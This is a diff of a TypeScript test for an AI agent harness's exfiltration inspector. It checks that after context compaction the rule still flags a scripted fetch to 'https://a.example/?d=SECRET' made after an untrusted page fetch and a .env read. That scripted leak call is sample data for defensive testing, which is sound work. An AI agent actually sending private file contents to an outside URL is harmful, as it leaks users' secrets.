@@ -55,6 +55,7 @@ function harness(
   untrusted: readonly FakeExchange[] = [],
   inspectors: readonly InspectorRegistration[] = [exfiltrationInspector],
   fetch?: FetchLike,
+  compactionThreshold?: number,
 ) {
   const net = fakeNetwork([], { untrusted })
   const memory = createMemoryHost({
@@ -73,6 +74,7 @@ function harness(
       connector: loop.connector,
       protectedFiles: [],
       log: () => {},
+      ...(compactionThreshold === undefined ? {} : { compactionThreshold }),
     },
     { tools: { WebFetch: 'real', Read: 'real' } },
   )
@@ -255,6 +257,49 @@ describe('the registered exfiltration rule in the loop', () => {
       expect(h.net.untrustedRequests).toHaveLength(direction === 'spill-to-private' ? 1 : 2)
     },
   )
+  it('keeps both conditions after a compaction summarizes the .env read and the fetch away', async () => {
+    // A second page and a final turn are there for the leak: a run that let the fetch out completes.
+    const h = harness([page(), page()], [exfiltrationInspector], undefined, 1000)
+    await task(h)
+    await start(h, 'https://a.example/start')
+    h.provider.script(done())
+    await allow(h)
+    h.provider.script(read())
+    h.provider.script(done())
+    await h.service.send({ sessionId: SESSION, origin: null, text: 'read the config' })
+    expect((await h.loop.runEnded()).reason.code).toBe('completed')
+    // Two plain turns: the boundary keeps them whole, so the cut covers both turns with evidence;
+    // the second one's usage puts the next boundary request over the 1000-token threshold.
+    for (const inputTokens of [9, 2000]) {
+      h.provider.script(scriptedTurn({ deltas: ['ok'], usage: { ...USAGE, inputTokens } }))
+      // oxlint-disable-next-line no-await-in-loop -- successive user turns establish distinct compaction boundaries
+      await h.service.send({ sessionId: SESSION, origin: null, text: 'carry on' })
+      // oxlint-disable-next-line no-await-in-loop -- each turn ends before the next is sent
+      expect((await h.loop.runEnded()).reason.code).toBe('completed')
+    }
+    h.provider.script(scriptedTurn({ deltas: ['summary'], usage: USAGE }))
+    h.provider.script(calls('https://a.example/?d=SECRET'))
+    h.provider.script(done())
+    await h.service.send({ sessionId: SESSION, origin: null, text: 'continue' })
+    expect((await h.loop.runEnded()).reason.code).toBe('paused')
+    const facts = await all(h)
+    const anchors = facts.filter((e) => e.name === 'compaction/anchor')
+    expect(anchors).toHaveLength(1)
+    const results = facts.filter((e) => e.name === 'tool/result')
+    expect(results).toHaveLength(2)
+    // Both the untrusted fetch and the private read lie inside what the summary replaced.
+    for (const result of results)
+      expect(Number(anchors[0]!.payload['coversThroughEntryId'])).toBeGreaterThan(result.entryId)
+    expect(await pending(h)).toMatchObject({
+      allowScope: 'once',
+      card: {
+        reason: 'flagged',
+        facts: { category: 'exfiltration' },
+        target: { type: 'url', url: 'https://a.example/?d=SECRET' },
+      },
+    })
+    expect(h.net.untrustedRequests).toHaveLength(1)
+  })
   it('clear resets the incarnation evidence and permits a new first fetch with a network card', async () => {
     const h = harness([page()])
     await task(h)
